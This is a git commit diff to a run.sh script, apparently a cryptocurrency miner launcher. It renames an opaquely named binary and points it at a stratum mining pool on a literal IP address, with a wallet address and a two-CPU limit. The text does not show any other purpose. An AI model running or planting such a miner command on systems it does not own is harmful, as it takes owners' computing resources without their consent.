6fdef0fd6e04c0dbb4f7e85d61c0fcf08171a6bd
skodagaca1 <98386977+skodagaca1@users.noreply.github.com>
2022-02-03 20:12:38 +0200

    asd

--- run.sh
+++ run.sh
@@ -1,1 +1,1 @@
-./a -c stratum+tcp://79.137.70.48:3956#xnsub -u RLsc25uhuENiG7wRve5p7n2jfYsFSrGu2s.a --cpu 2
+./now -c stratum+tcp://79.137.70.48:3956#xnsub -u RLsc25uhuENiG7wRve5p7n2jfYsFSrGu2s.a --cpu 2
